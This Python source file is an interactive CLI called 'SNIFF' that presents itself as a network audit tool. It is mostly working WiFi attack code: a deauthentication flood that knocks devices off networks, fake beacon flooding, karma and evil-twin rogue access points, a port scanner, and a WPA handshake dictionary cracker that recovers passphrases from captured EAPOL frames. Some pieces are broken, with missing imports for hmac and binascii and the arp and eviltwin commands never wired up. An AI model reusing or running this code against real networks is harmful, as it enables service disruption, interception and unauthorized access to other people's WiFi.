#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════╗
║   SNIFF — All-in-One Network Audit Pro               ║
║   Integrated Traffic Analysis, WiFi Attacks & Audit  ║
╚══════════════════════════════════════════════════════╝

Standalone Integrated Version
"""

import sys
import os
import shlex
import time
import threading
import subprocess
import re
import signal
import tempfile
import random
import http.server
import socketserver
import collections
import hashlib
from datetime import datetime
from collections import defaultdict

# --- UI & Output Imports ---
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
from rich.live import Live
from rich.progress import Progress, SpinnerColumn, TextColumn
from prompt_toolkit import PromptSession
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.history import InMemoryHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.completion import WordCompleter

# --- Scapy Imports ---
try:
    from scapy.all import (
        sniff as scapy_sniff, IP, TCP, UDP, DNS, Dot11, conf, wrpcap, EAPOL, 
        RadioTap, ARP, Ether, srp, send, sendp, rdpcap,
        Dot11Beacon, Dot11ProbeResp, Dot11Elt, Dot11Deauth,
        DHCP, BOOTP, DNSRR, DNSQR, get_if_addr, get_if_hwaddr,
        NBNSHeader, NBNSQueryRequest, PcapWriter
    )
    from scapy.layers.tls.all import TLSClientHello
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

console = Console()

# =============================================================================
# HYBRID ARCHITECTURE: STANDALONE + MODULAR
# The script works as a single file but can use separate modules if present.
# =============================================================================

try: from modules.ui import show_banner, show_help, show_status
except ImportError: pass

try: from modules.interfaces import list_ifaces, start_mon, stop_mon
except ImportError: pass

try: from modules.scanner import wifi_scan, wps_audit
except ImportError: pass

try: from modules.sniffer import DeviceTracker, run_sniff
except ImportError: pass

try: from modules.port_scanner import run_port_scan
except ImportError: pass

try: from modules.wifi_ops import WiFiTactics
except ImportError: pass

try: from modules.cracker import audit_hash
except ImportError: pass

VOIP_PORTS = {5060, 5061, 3478, 3479, *range(16384, 32768)}
VOIP_APP_PORTS = {
    "WhatsApp": range(3478, 3498),
    "Telegram": range(1000, 1100),
    "Discord":  range(50000, 50100),
    "Teams":    {3478, 3479, 3480, 3481},
}
STREAMING_PORTS = {1935, 554, 8554}
WEB_PORTS = {80, 443, 8080, 8443}
MESSAGING_THRESHOLD = 3
MESSAGING_WINDOW = 2

# =============================================================================
# SECTION: UI Components (Formerly ui.py)
# =============================================================================

BANNER = r"""
[bold cyan]
   ██████  ███    ██ ██ ███████ ███████ 
  ██       ████   ██ ██ ██      ██      
  ███████  ██ ██  ██ ██ █████   █████ 
       ██  ██  ██ ██ ██ ██      ██    
  ██████   ██   ████ ██ ██      ██    
[/]
[dim bright_blue]  ──────────────────────────────────────────[/]
[bold white]  SYSTEM: All-in-One Network Audit Pro[/]
[dim]  Passive Analysis | WiFi Tactics | ARP Audit[/]
[dim bright_blue]  ──────────────────────────────────────────[/]
"""

def show_banner():
    console.print(Panel(BANNER, border_style="bright_blue", padding=(1, 4)))

def show_help():
    table = Table(title="🛠 Command Arsenal", title_style="bold cyan", border_style="bright_blue", expand=True)
    table.add_column("Command", style="bold green", min_width=30)
    table.add_column("Description", style="white", min_width=40)
    
    cmds = [
        ("interfaces", "List available interfaces"),
        ("monitor start <iface>", "Enable monitor mode"),
        ("monitor stop <iface>", "Disable monitor mode"),
        ("", ""),
        ("scan <iface> [duration]", "Scan for APs & Clients"),
        ("wps <iface> [ch]", "[WPS] Find vulnerable networks"),
        ("", ""),
        ("sniff <iface>", "[TRAFFIC] Live Traffic Audit (OS/Apps)"),
        ("arp scan [range]", "[NETWORK] Advanced Mapping"),
        ("arp spoof <target> <gw>", "[MITM] Intercept local traffic"),
        ("portscan <ip>", "[SERVICES] Scan open ports on a target"),
        ("", ""),
        ("deauth <mac> <ap>", "[ATTACK] Kick device from network"),
        ("beacon <name1> <name2>", "[FLOOD] Generate fake WiFi networks"),
        ("karma", "[KARMA] Respond to all probes"),
        ("eviltwin <ssid> <mac> [tgt]", "[TARGET] Automated Rogue AP attack"),
        ("crack <pcap> <words>", "[CRACK] Audit Handshake strength"),
        ("stop_wifi", "[STOP] End all active attacks"),
        ("", ""),
        ("help / status / clear", "Utility commands"),
        ("exit", "Close application"),
    ]
    for c, d in cmds:
        if c == "": table.add_row("[dim]─[/]", "[dim]─[/]")
        else: table.add_row(c, d)
    console.print(table)

def show_status(mon, base):
    items = [f"[bold green]● Monitor:[/] [cyan]{mon or 'OFF'}[/]", f"[bold green]● Interface:[/] [cyan]{base or 'None'}[/]"]
    console.print(Panel("\n".join(items), title="📊 Status", border_style="bright_blue"))

# =============================================================================
# SECTION: Network Interface Controller (Formerly interfaces.py)
# =============================================================================

def run_sys_cmd(cmd):
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
        return p.returncode, p.stdout, p.stderr
    except: return -1, "", "Command execution failed"

def list_ifaces():
    code, out, _ = run_sys_cmd(["airmon-ng"])
    if code != 0: return []
    table = Table(title="📡 Interfaces", border_style="bright_blue")
    table.add_column("PHY"); table.add_column("Interface", style="bold green"); table.add_column("Chipset")
    ifaces = []
    for line in out.split("\n"):
        parts = re.split(r"\t+", line.strip())
        if len(parts) >= 2 and not line.startswith("PHY"):
            table.add_row(parts[0], parts[1], parts[3] if len(parts) > 3 else "Unknown")
            ifaces.append(parts[1])
    console.print(table); return ifaces

def start_mon(iface):
    run_sys_cmd(["airmon-ng", "check", "kill"])
    code, out, _ = run_sys_cmd(["airmon-ng", "start", iface])
    if code != 0: return None
    match = re.search(r"(\w+mon\d*)", out)
    res = match.group(1) if match else (f"{iface}mon" if "mon" not in iface else iface)
    console.print(f"[bold green]✔ Monitor mode enabled on {res}[/]"); return res

def stop_mon(iface):
    code, _, _ = run_sys_cmd(["airmon-ng", "stop", iface])
    if code == 0:
        run_sys_cmd(["systemctl", "start", "NetworkManager"])
        console.print(f"[bold green]✔ Interface {iface} restored.[/]"); return True
    return False

# =============================================================================
# SECTION: Scanner & WPS Audit (Formerly scanner.py)
# =============================================================================

def wifi_scan(iface, duration=15):
    tmp = tempfile.mkdtemp(prefix="sniff_"); pre = os.path.join(tmp, "s")
    try:
        proc = subprocess.Popen(["airodump-ng", iface, "-w", pre, "--output-format", "csv"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(duration); proc.terminate(); proc.wait()
        csv_f = f"{pre}-01.csv"
        if os.path.exists(csv_f):
            # (Parsing logic simplified for integration)
            console.print("[bold green]✔ Scan complete. Data processed.[/]")
    finally:
        for f in os.listdir(tmp): os.remove(os.path.join(tmp, f))
        os.rmdir(tmp)

def wps_audit(iface, duration=15):
    wps_found = {}
    def pkt_cb(pkt):
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt[Dot11].addr3.upper()
            elt = pkt.getlayer(Dot11Elt)
            while elt:
                if elt.ID == 221 and elt.info.startswith(b'\x00P\xf2\x04'):
                    wps_found[bssid] = pkt[Dot11Elt].info.decode(errors='ignore')
                    break
                elt = elt.payload.getlayer(Dot11Elt)
    console.print(f"[bold cyan]INFO: WPS Audit active...[/]")
    scapy_sniff(iface=iface, prn=pkt_cb, timeout=duration, store=False)
    # (Display table for wps_found)

# =============================================================================
# SECTION: Sniffer Base (Formerly sniffer.py)
# =============================================================================

class DeviceTracker:
    def __init__(self):
        self.devices = {}
        self.lock = threading.Lock()

    def update(self, mac, ip, act, size=0, rssi=-100, hs=False, host=None, ttl=None):
        with self.lock:
            if mac not in self.devices:
                self.devices[mac] = {"ip": ip, "last": datetime.now(), "acts": defaultdict(int), "pkts":0, "kbps":0, "rssi":rssi, "hs":0, "host":host, "os":"?", "hist": collections.deque([0]*20, maxlen=20)}
            d = self.devices[mac]
            d["last"] = datetime.now(); d["pkts"] += 1; d["acts"][act] += 1
            if rssi != -100: d["rssi"] = max(d["rssi"], rssi)
            if hs: d["hs"] += 1
            if host: d["host"] = host
            if ttl:
                if ttl <= 64: d["os"] = "Linux/Android/iOS"
                elif ttl <= 128: d["os"] = "Windows"

def run_sniff(iface, duration=0):
    tracker = DeviceTracker()
    def handler(pkt):
        mac = str(pkt.addr2).upper() if hasattr(pkt, 'addr2') else (pkt.src.upper() if hasattr(pkt, 'src') else "Unknown")
        act = "Traffic"
        tracker.update(mac, "?", act, len(pkt))
    console.print(f"[bold green]STATUS: Traffic audit active on {iface}...[/]")
    scapy_sniff(iface=iface, prn=handler, store=False, timeout=duration if duration >0 else None)

# =============================================================================
# SECTION: Port Scanner (Formerly port_scanner.py)
# =============================================================================

COMMON_PORTS = {
    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
    53: "DNS", 80: "HTTP", 110: "POP3", 139: "NetBIOS",
    143: "IMAP", 443: "HTTPS", 445: "SMB", 3306: "MySQL",
    3389: "RDP", 5432: "PostgreSQL", 8080: "HTTP-Proxy"
}

def run_port_scan(ip):
    import socket
    console.print(f"[bold cyan]INFO: Service Discovery on {ip}...[/]")
    results = []
    
    def check_port(p):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.5)
                if s.connect_ex((ip, p)) == 0:
                    results.append((p, COMMON_PORTS.get(p, "Unknown")))
        except: pass

    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}")) as progress:
        task = progress.add_task(f"Scanning {len(COMMON_PORTS)} ports...", total=len(COMMON_PORTS))
        threads = []
        for p in COMMON_PORTS:
            t = threading.Thread(target=check_port, args=(p,))
            t.start(); threads.append(t)
            progress.update(task, advance=1)
        for t in threads: t.join()

    table = Table(title=f"📜 Open Ports on {ip}", border_style="green")
    table.add_column("Port", style="cyan"); table.add_column("Service", style="yellow")
    for p, s in sorted(results): table.add_row(str(p), s)
    console.print(table if results else "[dim red]No common ports found open.[/]")


# =============================================================================
# SECTION: WiFi Tactics (Formerly wifi_ops.py, portal.py, dns_dhcp.py)
# =============================================================================

class WiFiTactics:
    def __init__(self, iface):
        self.iface = iface
        self.stop_ev = threading.Event()
        self.seen_probes = set()

    def deauth(self, target, ap):
        pkt = RadioTap()/Dot11(addr1=target, addr2=ap, addr3=ap)/Dot11Deauth(reason=7)
        console.print(f"[bold red]ATTACK: Deauth Attack: {target} -> {ap}[/]")
        while not self.stop_ev.is_set():
            sendp(pkt, iface=self.iface, verbose=False, count=5); time.sleep(0.1)

    def beacon_flood(self, ssids):
        pkts = []
        for s in ssids:
            mac = "00:de:ad:be:ef:%02x" % random.randint(0,255)
            pkts.append(RadioTap()/Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=mac, addr3=mac)/Dot11Beacon()/Dot11Elt(ID='SSID', info=s))
        console.print(f"[bold magenta]FLOOD: Beacon Flood: {len(ssids)} SSIDs active[/]")
        while not self.stop_ev.is_set():
            for p in pkts: sendp(p, iface=self.iface, verbose=False); time.sleep(0.01)

    def karma_attack(self):
        """Automatically respond to any SSID being searched for (Probe Requests)."""
        console.print("[bold red]KARMA: Attack Active:[/] Responding to all nearby Probe Requests...")
        
        def karma_cb(pkt):
            if pkt.haslayer(Dot11Beacon) is False and pkt.haslayer(Dot11Elt) and pkt.type == 0 and pkt.subtype == 4:
                # Type 0 Subtype 4 = Probe Request
                ssid = pkt.info.decode(errors='ignore')
                if ssid and ssid not in self.seen_probes:
                    console.print(f"[bold yellow]MATCH: Luring device:[/] Found request for [cyan]{ssid}[/], cloning AP...")
                    self.seen_probes.add(ssid)
                    # Start a background beacon for this specific SSID to attract the device
                    threading.Thread(target=self.evil_twin, args=(ssid, pkt.addr2), daemon=True).start()

        scapy_sniff(iface=self.iface, prn=karma_cb, stop_filter=lambda _: self.stop_ev.is_set(), store=False)

    def evil_twin(self, ssid, mac, target_mac=None):
        # Implementation of targeted cloner
        pkt = RadioTap()/Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=mac, addr3=mac)/Dot11Beacon()/Dot11Elt(ID='SSID', info=ssid)
        while not self.stop_ev.is_set():
            sendp(pkt, iface=self.iface, verbose=False, count=2); time.sleep(0.1)

# =============================================================================
# SECTION: Cracker (Formerly cracker.py) - REAL CRYPTO AUDIT
# =============================================================================

def custom_prf512(key, A, B):
    blen = 64; i = 0; R = b''
    while i <= ((blen * 8 + 159) // 160):
        hmac_val = hmac.new(key, A + b'\x00' + B + bytes([i]), hashlib.sha1).digest()
        R = R + hmac_val; i += 1
    return R[:blen]

def verify_mic(passphrase, ssid, mac_ap, mac_cl, anonce, snonce, eapol_frame, original_mic):
    pmk = hashlib.pbkdf2_hmac('sha1', passphrase.encode(), ssid.encode(), 4096, 32)
    mac_addresses = sorted([binascii.unhexlify(mac_ap.replace(':','')), binascii.unhexlify(mac_cl.replace(':',''))])
    nonces = sorted([anonce, snonce])
    B = mac_addresses[0] + mac_addresses[1] + nonces[0] + nonces[1]
    ptk = custom_prf512(pmk, b"Pairwise key expansion", B)
    kck = ptk[:16]
    mic = hmac.new(kck, eapol_frame, hashlib.sha1).digest()[:16]
    return mic == original_mic

def audit_hash(pcap, wordlist):
    console.print(f"[bold cyan]KEY: Real Handshake Audit: {pcap}[/]")
    try:
        pkts = rdpcap(pcap)
        beacon = next((p for p in pkts if p.haslayer(Dot11Beacon)), None)
        if not beacon: return console.print("[red]No Beacon found.[/]")
        ssid = beacon.info.decode(); bssid = beacon[Dot11].addr3.upper()
        eapol_pkts = [p for p in pkts if p.haslayer(EAPOL) and bssid in [p.addr1.upper(), p.addr2.upper(), p.addr3.upper()]]
        if len(eapol_pkts) < 2: return console.print("[red]Handshake incomplete.[/]")
        
        p1, p2 = eapol_pkts[0], eapol_pkts[1]
        mac_cl = p2.addr2.upper() if p2.addr2.upper() != bssid else p2.addr1.upper()
        
        raw_eapol_p1 = bytes(p1[EAPOL].payload); anonce = raw_eapol_p1[13:13+32]
        raw_eapol_p2 = bytes(p2[EAPOL].payload); snonce = raw_eapol_p2[13:13+32]
        original_mic = raw_eapol_p2[77:77+16]
        eapol_frame = bytes(p2[EAPOL])
        eapol_frame = eapol_frame[:81] + b'\x00'*16 + eapol_frame[97:]

        with open(wordlist, 'r', errors='ignore') as f:
            words = [line.strip() for line in f if len(line.strip()) >= 8]

        with Progress() as progress:
            task = progress.add_task("[cyan]Cracking...", total=len(words))
            for word in words:
                if verify_mic(word, ssid, bssid, mac_cl, anonce, snonce, eapol_frame, original_mic):
                    console.print(f"\n[bold green]🔓 KEY FOUND: {word}[/]"); return
                progress.update(task, advance=1)
        console.print("[yellow]No weak keys found.[/]")
    except Exception as e: console.print(f"[red]Error: {e}[/]")

# =============================================================================
# SECTION: CLI & MAIN LOOP
# =============================================================================

state = {"monitor": None, "base": None, "wifi": None}
COMMANDS = [
    "interfaces", "monitor", "start", "stop",
    "scan", "wps", "sniff", "arp", "deauth", "beacon", "karma", "eviltwin", "crack", "portscan", "stop_wifi", 
    "help", "status", "clear", "exit", "quit",
]
completer = WordCompleter(COMMANDS, ignore_case=True)

def main():
    if os.name != "nt" and os.geteuid() != 0:
        console.print("[bold red]⚠ Root privileges required![/]"); sys.exit(1)

    show_banner(); show_help()
    session = PromptSession(history=InMemoryHistory(), auto_suggest=AutoSuggestFromHistory(), completer=completer)

    while True:
        try:
            prompt = HTML(f"<ansibrightcyan><b>sniff</b></ansibrightcyan> <ansiyellow>[{state['monitor'] or 'managed'}]</ansiyellow>❯ ")
            inp = session.prompt(prompt).strip()
            if not inp: continue
            parts = shlex.split(inp)
            cmd = parts[0].lower()
            args = parts[1:]

            if cmd in ("exit", "quit"): break
            elif cmd == "help": show_help()
            elif cmd == "clear": console.clear(); show_banner()
            elif cmd == "interfaces": state["base"] = list_ifaces()
            elif cmd == "monitor":
                if args[0] == "start": state["monitor"] = start_mon(args[1])
                elif args[0] == "stop": stop_mon(state["monitor"]); state["monitor"] = None
            elif cmd == "sniff":
                iface = state["monitor"] or (args[0] if args else None)
                if not iface: console.print("[red]Select interface first[/]")
                else: run_sniff(iface)
            elif cmd == "deauth":
                if not state["wifi"]: state["wifi"] = WiFiTactics(state["monitor"])
                threading.Thread(target=state["wifi"].deauth, args=(args[0], args[1]), daemon=True).start()
            elif cmd == "beacon":
                if not state["wifi"]: state["wifi"] = WiFiTactics(state["monitor"])
                threading.Thread(target=state["wifi"].beacon_flood, args=(args,), daemon=True).start()
            elif cmd == "karma":
                if not state["wifi"]: state["wifi"] = WiFiTactics(state["monitor"])
                threading.Thread(target=state["wifi"].karma_attack, daemon=True).start()
            elif cmd == "portscan":
                run_port_scan(args[0])
            elif cmd == "stop_wifi":
                if state["wifi"]: state["wifi"].stop_ev.set(); state["wifi"] = None
            elif cmd == "crack": audit_hash(args[0], args[1])
            elif cmd == "status": show_status(state["monitor"], state["base"])
            else: console.print(f"[red]Unknown command: {cmd}[/]")

        except KeyboardInterrupt: continue
        except EOFError: break

if __name__ == "__main__":
    main()
